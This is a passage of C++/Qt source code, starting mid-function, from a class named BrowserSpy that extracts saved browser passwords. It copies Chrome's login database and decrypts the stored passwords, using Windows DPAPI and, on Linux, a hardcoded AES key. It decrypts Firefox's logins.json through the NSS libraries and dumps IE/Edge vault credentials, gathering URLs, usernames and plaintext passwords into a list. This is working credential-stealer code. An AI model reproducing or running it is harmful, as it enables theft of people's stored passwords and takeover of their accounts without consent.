        qDebug() << "Unable to copy file" << dbFile;
        return QVariantList();
    }

    QSqlDatabase db = QSqlDatabase::addDatabase("QSQLITE");
    db.setDatabaseName(dbFile);
    if (!db.open()) {
        qDebug() << "Unable to open sqlite database" << dbFile << "does not exists";
        return QVariantList();
    }

    QVariantList passwords;
    auto query = db.exec("SELECT * FROM logins");

    while (query.next()) {
        QString origin_url = query.value("origin_url").toString();
        QString username_value = query.value("username_value").toString();
        QByteArray password_value = query.value("password_value").toByteArray();

#ifdef Q_OS_WIN
        DATA_BLOB dec_data;
        DATA_BLOB enc_data;
        enc_data.cbData = password_value.size();
        enc_data.pbData = (BYTE*)password_value.data();
        if(CryptUnprotectData(&enc_data, NULL, NULL, NULL, NULL, 0, &dec_data))
        {
            password_value = QByteArray((const char *)dec_data.pbData, dec_data.cbData);
        } else
        {
            password_value = "";
        }
#endif
#ifdef Q_OS_LINUX
    password_value = QAESEncryption::Decrypt(QAESEncryption::AES_128,
                                             QAESEncryption::CBC,
                                             password_value, "inZC98gCLnE5pXDdS6wQ9Q==",
                                           //01234567890123456
                                             "                ");
    qDebug() << password_value;

#endif
        addPasswordToList(passwords, "chrome",
                          origin_url, username_value,
                          QString(password_value));
    }
    return passwords;
}
QVariantList BrowserSpy::readFirefoxPasswords()
{
    #ifdef Q_OS_WIN
    auto pp = getFirefoxPath();

    auto path = getFirefoxLibPath();

    if (path == QString())
        return QVariantList();

    char mk[1024] = {0};
    QVariantList passwords;
    auto ff_prof_path = firefox::get_user_profile_path();
    if (!firefox::LoadFirefoxLibraries(path)){
        qDebug() << "error load";
        return QVariantList();
    }
    if(!firefox::InitializeNSSLibrary(ff_prof_path, mk) )  {
        qDebug() << "error";
        return QVariantList();
    }

    QFile loginsJson(QString(ff_prof_path) + "/logins.json");
    if (!loginsJson.open(QIODevice::ReadOnly)) {
        qDebug() << "Unable to open json file";
        return QVariantList();
    }
    //        dump_ff(ff_prof_path);
    QJsonDocument json = QJsonDocument::fromJson(loginsJson.readAll());
    loginsJson.close();

    auto loginsArray = json.object().value("logins").toArray();
    qDebug() << loginsArray;

    foreach(auto v, loginsArray) {
        auto obj = v.toObject();
        if (obj == QJsonObject())
            continue;
        auto url = obj.value("hostname").toString();
        auto u = obj.value("encryptedUsername").toString();
        auto p = obj.value("encryptedPassword").toString();
        char *clearPassword = NULL;
        char *clearUsername = NULL;
        firefox::DecryptSecretString(u.toLocal8Bit().data(), &clearUsername);
        firefox::DecryptSecretString(p.toLocal8Bit().data(), &clearPassword);

        addPasswordToList(passwords, "firefox", url,
                          QString(clearUsername),
                          QString(clearPassword));
    }
    firefox::TerminateFirefoxLibrary();

    return passwords;
#endif
    return QVariantList();
}
QVariantList BrowserSpy::readIEPasswords()
{
    #ifdef Q_OS_WIN
    QVariantList passwords;
#ifdef Q_OS_WIN
    //    log_info("Starting IE10 / MSEdge dump...\n");
    if(ie::get_ie_vault_creds(passwords) == -1) {
        log_error("get_ie_vault_creds() failure");
    }

    //        log_info("Starting IE7-IE9 dump...\n");
//    if(ie::get_ie_registry_creds() == -1) {
//        log_error("get_ie7_ie9_creds() failure");
//    }
#endif
    return passwords;
#else
    return QVariantList();
#endif
}

void BrowserSpy::addPasswordToList(QVariantList &list, const QString &browser, const QString &url, const QString &username, const QString &password)
{
    QVariantMap map;
    map.insert("browser", browser);
    map.insert("url", url);
    map.insert("username", username);
    map.insert("password", password);
    list.append(map);
}

QString BrowserSpy::getChromePath()
{
    auto locs = QStandardPaths::standardLocations(QStandardPaths::GenericConfigLocation);
    if (!locs.count()) {
        qDebug() << "Unable to find cache dir";
        return QString();
    }

#ifdef Q_OS_WIN
    auto path = locs.first() + "/Google/Chrome/User Data/Default/";
#else
    auto path = locs.first() + "/google-chrome/Default/";
#endif
    return path;
}

QString BrowserSpy::getFirefoxPath()
{
    auto locs = QStandardPaths::standardLocations(QStandardPaths::DataLocation);
    if (!locs.count()) {
        qDebug() << "Unable to find cache dir";
        return QString();
    }
    auto path = locs.first() + "/Mozilla/Firefox/";
    return path;
    auto profileFilePath = path + "profiles.ini";
    copyFile(profileFilePath);
    QFile profiles(profileFilePath);
    if (!profiles.open(QIODevice::ReadOnly))
        return QString();

}

QString BrowserSpy::getFirefoxLibPath()
{
    QSettings reg("HKEY_LOCAL_MACHINE\\SOFTWARE\\Clients\\StartMenuInternet\\FIREFOX.EXE\\shell\\open\\command", QSettings::NativeFormat);
    auto p = reg.value("Default").toString();
    if (p.startsWith("\""))
        p = p.remove(0, 1);
    if (p.endsWith("\""))
        p = p.remove(p.length() - 1, 1);
    return p;
}

bool BrowserSpy::copyFile(QString &file, bool rawCopy)
{
    qsrand(QTime::currentTime().msec());
    QString t = QDir::tempPath() + "/data." + QString::number(qrand());
    if (QFile::exists(t) && !QFile::remove(t))
        return false;

#ifdef Q_OS_WIN
    if (rawCopy) {
        if (ERROR_SUCCESS != RawCopy(file.toStdWString(), t.toStdWString()))
            return false;
    } else {
        if (!CopyFileA(file.toLocal8Bit().data(), t.toLocal8Bit().data(), false)) {
            qDebug() << "Unable to copy file" << file << "to"
                     << t;
            return false;
        }
    }
#else
    if (!QFile::copy(file, t)) {
        return false;
    }
#endif

    file = t;
    return true;
}
